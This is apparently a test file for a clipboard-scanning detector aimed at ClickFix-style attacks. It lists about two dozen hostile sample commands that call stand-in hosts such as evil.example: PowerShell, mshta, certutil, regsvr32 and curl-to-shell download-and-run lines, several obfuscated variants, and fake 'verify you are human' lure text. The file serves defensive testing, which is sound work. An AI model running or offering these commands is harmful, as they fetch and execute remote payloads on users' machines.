import { test } from "node:test";
import assert from "node:assert/strict";
import { analyze, normalize } from "../src/patterns.ts";

// Shapes lifted from public ClickFix / FileFix / TerminalFix write-ups (Microsoft, Malwarebytes, Recorded Future, Group-IB).
const MALICIOUS: Array<[string, string]> = [
  ["powershell -w hidden -c \"iwr http://x.example/a.ps1 | iex\" # ✅ ''I am not a robot - reCAPTCHA Verification ID: 7811''", "clickfix-marker"],
  ["powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"$u='https://evil.example/l.txt';iex (New-Object Net.WebClient).DownloadString($u)\"", "powershell-hidden"],
  ["PowerShell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "powershell-hidden"],
  ["pwsh -ep bypass -c \"irm https://evil.example/x | iex\"", "powershell-bypass"],
  ["powershell -EncodedCommand aWV4IChpd3IgaHR0cDovL2V2aWwuZXhhbXBsZS94KQ==", "powershell-encoded"],
  ["mshta https://evil.example/verify.hta", "mshta-remote"],
  ["mshta \"javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -c ...')\"", "mshta-remote"],
  ["cmd /c \"start /min powershell -NoP -c Get-Content C:\\\\Users\\\\Public\\\\v.txt\"", "cmd-chained-loader"],
  ["curl -fsSL https://evil.example/mac | bash", "curl-pipe-shell"],
  ["/bin/bash -c \"$(curl -fsSL https://evil.example/install.sh)\"", "shell-c-curl"],
  ["echo 'Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9hIHwgYmFzaAo=' | base64 -d | bash", "base64-decode-shell"],
  ["certutil.exe -urlcache -split -f http://evil.example/a.exe a.exe && a.exe", "certutil-urlcache"],
  ["bitsadmin /transfer job /download /priority high http://evil.example/a.exe %temp%\\a.exe", "bitsadmin-transfer"],
  ["regsvr32 /s /n /u /i:https://evil.example/a.sct scrobj.dll", "regsvr32-remote"],
  ["osascript -e 'do shell script \"curl -s https://evil.example/p | sh\"'", "curl-pipe-shell"],
  ["powershell -c \"iwr evil.example/f -o $env:tmp\\f.exe;start $env:tmp\\f.exe\" # C:\\Users\\Public\\Downloads\\report.pdf", "filefix-path-comment"],
  ["python3 -c \"import urllib.request as u;exec(u.urlopen('https://evil.example/p').read())\"", "python-inline-loader"],
  // Caret-escaped cmd keyword (obfuscation).
  ["c^m^d /c p^o^w^e^r^s^h^e^l^l -c \"iex(irm https://evil.example/x)\"", "powershell-download-exec"],
  // Backtick-broken PowerShell.
  ["p`o`w`e`r`s`h`e`l`l -w hidden -c whoami", "powershell-hidden"],
  // String-concatenation split used on ClickFix pages.
  ["\"p\"+\"owershell\" -w hidden -c whoami", "powershell-hidden"],
  ["To continue, open Terminal and paste: bash -c \"whoami\"", "run-dialog-instruction"],
  // Zero-width characters sprinkled in to defeat naive matching.
  ["power\u200Bshell -w hid\u200Bden -c \"iex(iwr http://evil.example/x)\"", "powershell-hidden"],
  // Smart quotes from a styled web page.
  ["powershell -w hidden -c \u201Ciex (irm https://evil.example/x)\u201D", "powershell-hidden"],
  ["Press Win+R, paste and hit Enter to verify you are human: msiexec /i http://evil.example/verify.msi /qn Cloudflare Verification", "run-dialog-instruction"],
];

const BENIGN: string[] = [
  "Hello, can you send me the report by Friday?",
  "https://github.com/hono/hono",
  "npm install hono @hono/node-server",
  "git commit -m \"fix: handle empty clipboard\"",
  "SELECT * FROM users WHERE id = 1;",
  "const x = await fetch(url); console.log(await x.json());",
  "powershell Get-Process | Sort-Object CPU -Descending | Select -First 5",
  "ls -la ~/Downloads",
  "docker run --rm -it -p 8080:8080 nginx",
  "ssh deploy@10.0.0.4",
  "curl -s https://api.example.com/v1/status",
  "brew install node",
  "python3 -c \"print(2**10)\"",
  "I am not a robot, I promise. See you at the CAPTCHA-themed party!",
  "echo hello | base64",
  "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser",
  "kubectl get pods -n prod",
  "The quick brown fox jumps over the lazy dog. ".repeat(50),
];

test("known ClickFix shapes are blocked with the expected rule", () => {
  for (const [sample, rule] of MALICIOUS) {
    const v = analyze(sample);
    assert.ok(v, `expected a verdict for: ${sample}`);
    assert.equal(v!.rule, rule, `wrong rule for: ${sample}`);
  }
});

test("ordinary clipboard contents are left alone", () => {
  for (const sample of BENIGN) {
    assert.equal(analyze(sample), null, `false positive on: ${sample}`);
  }
});

test("very large clipboard payloads are skipped rather than scanned", () => {
  const big = "powershell -w hidden " + "x".repeat(30_000);
  assert.equal(analyze(big), null);
});

test("normalize strips invisible characters and unifies quotes", () => {
  assert.equal(normalize("a\u200Bb\u2019c\u00A0d"), "ab'c d");
});
